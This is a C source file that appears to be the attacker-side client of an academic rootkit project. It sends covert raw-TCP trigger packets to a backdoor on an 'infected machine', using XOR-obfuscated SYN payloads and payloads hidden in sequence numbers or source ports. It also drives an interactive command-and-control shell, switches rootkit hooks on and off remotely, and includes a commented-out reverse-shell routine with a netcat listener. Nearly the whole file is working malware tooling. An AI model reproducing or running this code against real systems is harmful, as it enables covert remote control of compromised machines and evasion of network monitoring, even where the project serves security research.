#include "lib/RawTCP.h"
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdlib.h>
#include <time.h>

#include "../common/constants.h"
#include "../common/c&c.h"
#include "include/sslserver.h"

// For printing with colors
#define KGRN  "\x1B[32m"
#define KYLW  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMGN  "\x1B[35m"
#define KRED  "\x1B[31m" 
#define RESET "\x1B[0m"


void print_welcome_message(){
    printf("*******************************************************\n");
    printf("************************* TFG *************************\n");
    printf("*******************************************************\n");
    printf("************ https://github.com/h3xduck/TFG ***********\n");
    printf("*******************************************************\n");
}

void print_help_dialog(const char* arg){
    printf("\nUsage: %s OPTION victim_IP\n\n", arg);
    printf("Program OPTIONs\n");
    char* line = "-S IP";
    char* desc = "Send a secret message to IP";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-c IP";
    desc = "Activate direct command & control shell with IP";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-h";
    desc = "Print this help";
    printf("\t%-40s %-50s\n\n", line, desc);

}

void check_ip_address_format(char* address){
    char* buf[256];
    int s = inet_pton(AF_INET, address, buf);
    if(s<0){
        printf("["KYLW"WARN"RESET"]""Error checking IP validity\n");
    }else if(s==0){
        printf("["KYLW"WARN"RESET"]""The victim IP is probably not valid\n");
    }
}

char* getLocalIpAddress(){
    char hostbuffer[256];
    char* IPbuffer = calloc(256, sizeof(char));
    struct hostent *host_entry;
    int hostname;
  
    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
    if(hostname==-1){
        perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostname");
        exit(1);
    }
  
    host_entry = gethostbyname(hostbuffer);
    if(host_entry == NULL){
        perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostbyname");
        exit(1);
    }
  
    // To convert an Internet network
    // address into ASCII string
    strcpy(IPbuffer,inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0])));
  
    printf("["KBLU"INFO"RESET"]""Attacker IP selected: %s\n", IPbuffer);
  
    return IPbuffer;
}

unsigned short crc16(const unsigned char* data_p, unsigned char length){
    unsigned char x;
    unsigned short crc = 0xFFFF;

    while (length--){
        x = crc >> 8 ^ *data_p++;
        x ^= x>>4;
        crc = (crc << 8) ^ ((unsigned short)(x << 12)) ^ ((unsigned short)(x <<5)) ^ ((unsigned short)x);
    }
    return crc;
}


/*void get_shell(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_PAYLOAD_GET_REVERSE_SHELL");
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");

    pid_t pid;
    pid = fork();
    if(pid < 0){
        perror("["KRED"ERROR"RESET"]""Could not create another process");
	    return;
	}else if(pid==0){
        sleep(1);
        //Sending the malicious payload
        if(rawsocket_send(packet)<0){
            printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
        }else{
            printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
        }
        
    }else {
        //Activating listener
        char *cmd = "nc";
        char *argv[4];
        argv[0] = "nc";
        argv[1] = "-lvp";
        argv[2] = "5888";
        argv[3] = NULL;

        printf("["KBLU"INFO"RESET"]""Trying to get a shell...\n");
        if(execvp(cmd, argv)<0){
            perror("["KRED"ERROR"RESET"]""Error executing background listener");
            return;
        }
        printf("["KGRN"OK"RESET"]""Got a shell\n");
    }
    
    free(local_ip);
}*/

void send_secret_packet(char* argv){
    //TODO revise this, in wireshark it is seen not to be a TCP packet??????
    //Should be working, it did in other projects
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, SECRET_PACKET_PAYLOAD);
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
    //Sending the malicious payload
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
    }else{
        printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
    }
    free(local_ip);
}

void activate_command_control_shell(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, CC_PROT_SYN);
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
    //Sending the malicious payload
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
        return;
    }else{
        printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
    }
    printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
    
    //Wait for rootkit ACK to ensure it's up
    rawsocket_sniff_pattern(CC_PROT_ACK);
    printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");   

    //Received ACK, we proceed to send command
    while(1){
        char buf[BUFSIZ];                                                                                                                                                          
        printf(""KYLW"c>:"RESET"");                                                                                                                                                              
        fgets(buf, BUFSIZ, stdin);
        if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
            buf[strlen(buf)-1] = '\0';   
        }                                                                                                                                                                         
        
        char msg[BUFSIZ];
        strcpy(msg, CC_PROT_MSG);
        strcat(msg, buf);
        packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, msg);
        printf("Sending %s\n", msg);
        if(rawsocket_send(packet)<0){
            printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
            return;
        }
        printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
        packet = rawsocket_sniff_pattern(CC_PROT_MSG);
        char* res = packet.payload;
        printf("["KGRN"RESPONSE"RESET"] %s\n", res);   
    }
    
    free(local_ip);
}

//Rootkit backdoor V2 being used - Bvp47 like
void activate_command_control_shell_encrypted(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    printf("["KBLU"INFO"RESET"]""Crafting malicious SYN packet...\n");
    //+1 since payload must finish with null character for parameter passing, although not sent in the actual packet payload
    char payload[CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE+1] = {0};
    srand(time(NULL));
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE; ii++){
        payload[ii] = (char)rand();
    }
    //Follow protocol rules
    char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_1;
    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_2;
    //K3 with command to start the encrypted connection with the backdoor
    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL;
    char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    memcpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = section[ii] ^ key1[ii];
    }
    memcpy(payload+0x06, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);

    memcpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = section[ii] ^ key2[ii];
    }
    memcpy(payload+0x0A, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);

    memcpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    memcpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = section[ii] ^ section2[ii] ^ key3[ii];
    }

    memcpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    
    
    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
    //Sending the malicious payload
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
        return;
    }else{
        printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
    }
    
    server_run(8500);
}

//For V2 backdoor - Sends secret packet that control state of hooks
void hook_control_command(char* argv, int mode){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    printf("["KBLU"INFO"RESET"]""Crafting malicious SYN packet...\n");
    //+1 since payload must finish with null character for parameter passing, although not sent in the actual packet payload
    char payload[CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE+1] = {0};
    srand(time(NULL));
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE; ii++){
        payload[ii] = (char)rand();
    }
    //Follow protocol rules
    char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_1;
    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_2;
    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1];
    //K3 with command to start the encrypted connection with the backdoor
    if(mode == 0){
        memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_DEACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    }else{
        memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_ACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    }
    char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    memcpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = section[ii] ^ key1[ii];
    }
    memcpy(payload+0x06, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);

    memcpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = section[ii] ^ key2[ii];
    }
    memcpy(payload+0x0A, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);

    memcpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    memcpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = section[ii] ^ section2[ii] ^ key3[ii];
    }

    memcpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    
    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
    //Sending the malicious payload
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
        return;
    }else{
        printf("["KGRN"OK"RESET"]""Secret message successfully sent! No answer expected\n");
    }
}

//Rootkit backdoor V3 being used - Hive-like
void activate_command_control_shell_encrypted_multi_packet(char* argv, int mode){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    printf("["KBLU"INFO"RESET"]""Crafting malicious packet stream...\n");
    
    //Stream of 3 packets, 4 bytes on each if using sequence numbers for hiding the payload
    //OR stream of 6 packets, 2 bytes each
    //Decide depending on selected mode
    int PAYLOAD_LEN, PACKET_CAPACITY;
    if(mode == CLIENT_MULTI_PACKET_TRIGGER_MODE_SEQ_NUM){
        PAYLOAD_LEN = CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM;
        PACKET_CAPACITY = CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM;
    }else if(mode== CLIENT_MULTI_PACKET_TRIGGER_MODE_SRC_PORT){
        PAYLOAD_LEN = CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT;
        PACKET_CAPACITY = CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT;
    }else{
        printf("["KRED"ERROR"RESET"]""An error occured with the selected mode of payload injection");
        return;
    }

    stream_t stream = build_standard_packet_stream_empty_payload(PAYLOAD_LEN/PACKET_CAPACITY, 8500, 9000, local_ip, argv);
    char *payload = calloc(PAYLOAD_LEN, sizeof(char));
    srand(time(NULL));
    for(int ii=0; ii<PAYLOAD_LEN; ii++){
        payload[ii] = (char)rand();
    }
    inet_pton(AF_INET, argv, (void*)(payload+0x01));
    uint16_t port = htons(8000);
    memcpy(payload+0x05, (char*)&port, 0x02);
    char result[0x03];
    char key[0x03] = CC_STREAM_TRIGGER_KEY_ENCRYPTED_SHELL;
    for(int ii=0; ii<0x02; ii++){
        result[ii] = payload[0x05+ii] ^ key[ii];
        printf("R:%x, P5:%x, K3:%x\n", result[ii], payload[0x05+ii], key[ii]);
    }
    memcpy(payload+0x08, result, 0x02);
    char* payload_p = payload;
    uint16_t crc = crc16(payload_p, 10);
    memcpy(payload+0x0A, (char*)&crc, 0x02);
    printf("Payload before XOR: ");
    for(int ii=0; ii<PAYLOAD_LEN; ii++){
        printf("%x ", payload[ii]);
    }
    printf("\n");
    //Rolling xor
    for(int ii=1; ii<PAYLOAD_LEN; ii++){
        char xor_res = payload[ii-1] ^ payload[ii];
        memcpy(payload+ii, (char*)&(xor_res), 0x01);
    }

    printf("Payload after XOR: ");
    for(int ii=0; ii<PAYLOAD_LEN; ii++){
        printf("%x ", payload[ii]);
    }
    printf("\n");

    //SYN packets
    for(int ii=0; ii<stream.stream_length; ii++){
        set_TCP_flags(*(stream.packet_stream+ii*(sizeof(packet_t))), 0x02);
    }
    //Injecting payload in the stream
    if(mode==CLIENT_MULTI_PACKET_TRIGGER_MODE_SEQ_NUM){
        stream_inject(stream, TYPE_TCP_SEQ_RAW, payload, PAYLOAD_LEN);
    }else if(mode==CLIENT_MULTI_PACKET_TRIGGER_MODE_SRC_PORT){
        stream_inject(stream, TYPE_TCP_SRC_PORT, payload, PAYLOAD_LEN);
    }

    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
    //Sending the malicious stream of packets with the hidden payload
    for(int ii=0; ii<stream.stream_length; ii++){
        if(rawsocket_send(*(stream.packet_stream+ii*(sizeof(packet_t))))<0){
            printf("["KRED"ERROR"RESET"]""An error occured at packet %i/%i. Is the machine up?\n", ii+1, stream.stream_length);
            return;
        }else{
            printf("["KGRN"OK"RESET"]""Packet %i/%i successfully sent!\n", ii+1, stream.stream_length);
        }
    }
    printf("["KGRN"OK"RESET"]""Packet stream successfully sent to the backdoor in completeness\n");
    
    server_run(8500);
}


void main(int argc, char* argv[]){
    if(argc<2){
        printf("["KRED"ERROR"RESET"]""Invalid number of arguments\n");
        print_help_dialog(argv[0]);
        return;
    }

    int ENCRYPT_MODE_SEL = 0;
    int DECRYPT_MODE_SEL = 0;
    int PATH_ARG_PROVIDED = 0;

    int PARAM_MODULE_ACTIVATED = 0;
    
    int opt;
    char dest_address[32];
    char path_arg[512];

    //Command line argument parsing
    while ((opt = getopt(argc, argv, ":S:c:e:u:a:s:h")) != -1) {
        switch (opt) {
        case 'S':
            print_welcome_message();
            sleep(1);
            //Send a secret message
            printf("["KBLU"INFO"RESET"]""Activated SEND a SECRET mode\n");
            //printf("Option S has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            send_secret_packet(dest_address);
            PARAM_MODULE_ACTIVATED = 1;
            
            break;
        case 'c':
            print_welcome_message();
            sleep(1);
            //Send a secret message
            printf("["KBLU"INFO"RESET"]""Activated COMMAND & CONTROL shell\n");
            //printf("Option S has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            activate_command_control_shell(dest_address);
            PARAM_MODULE_ACTIVATED = 1;
            
            break;
        case 'e':
            print_welcome_message();
            sleep(1);
            //Send a secret message
            printf("["KBLU"INFO"RESET"]""Activated COMMAND & CONTROL encrypted shell\n");
            //printf("Option S has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            activate_command_control_shell_encrypted(dest_address);
            PARAM_MODULE_ACTIVATED = 1;
            
            break;
        case 'u':
            print_welcome_message();
            sleep(1);
            //Send a secret message
            printf("["KBLU"INFO"RESET"]""Deactivating all rootkit hooks\n");
            //printf("Option S has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            hook_control_command(dest_address, 0);
            PARAM_MODULE_ACTIVATED = 1;
            
            break;
        case 'a':
            print_welcome_message();
            sleep(1);
            //Send a secret message
            printf("["KBLU"INFO"RESET"]""Activating all rootkit hooks\n");
            //printf("Option S has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            hook_control_command(dest_address, 1);
            PARAM_MODULE_ACTIVATED = 1;
            
            break;
        case 's':
            print_welcome_message();
            sleep(1);
            //Send a secret message
            printf("["KBLU"INFO"RESET"]""Activating COMMAND & CONTROL with MULTI-PACKET backdoor trigger\n");
            //printf("Option S has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            char buf[BUFSIZ];
            int mode = -1;
            while(mode<0){
                printf(">> Where to hide the payload? Select a number: \n\t1. SEQNUM\n\t2. SRCPORT\nOption: ");                                                                                                                                                              
                fgets(buf, BUFSIZ, stdin);
                if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
                    buf[strlen(buf)-1] = '\0';   
                }
                if(strncmp(buf, "1", 6)==0){
                    mode = CLIENT_MULTI_PACKET_TRIGGER_MODE_SEQ_NUM;
                }else if(strncmp(buf, "2", 7)==0){
                    mode = CLIENT_MULTI_PACKET_TRIGGER_MODE_SRC_PORT;
                }
            }

            activate_command_control_shell_encrypted_multi_packet(dest_address, mode);
            PARAM_MODULE_ACTIVATED = 1;
            
            break;
        /*case 'u': 
            print_welcome_message();
            sleep(1);
            //Selecting show rootkit - Unhide mode
            printf("["KBLU"INFO"RESET"]""Selected UNHIDE the rootkit remotely\n");
            //printf("Option m has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            show_rootkit(dest_address);
            PARAM_MODULE_ACTIVATED = 1;

            break;
        case 'i': 
            print_welcome_message();
            sleep(1);
            //Selecting hide rootkit - Invisible mode
            printf("["KBLU"INFO"RESET"]""Selected HIDE the rootkit remotely\n");
            //printf("Option m has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            hide_rootkit(dest_address);
            PARAM_MODULE_ACTIVATED = 1;
        
        case 'e': 
            ENCRYPT_MODE_SEL = 1;
            strcpy(dest_address, optarg);

            break;
        case 'd':
            DECRYPT_MODE_SEL = 1;
            strcpy(dest_address, optarg);
            break;

        case 'p':
            PATH_ARG_PROVIDED = 1;
            strcpy(path_arg, optarg);
            break;*/

        case 'h':
            print_help_dialog(argv[0]);
            exit(0);
            break;
        case '?':
            printf("["KRED"ERROR"RESET"]""Unknown option: %c\n", optopt);
            break;
        case ':':
            printf("["KRED"ERROR"RESET"]""Missing arguments for %c\n", optopt);
            exit(EXIT_FAILURE);
            break;
        
        default:
            print_help_dialog(argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    if(PARAM_MODULE_ACTIVATED==0){
        printf("["KRED"ERROR"RESET"]""Invalid parameters\n");
        print_help_dialog(argv[0]);
        exit(EXIT_FAILURE);
    }
   
}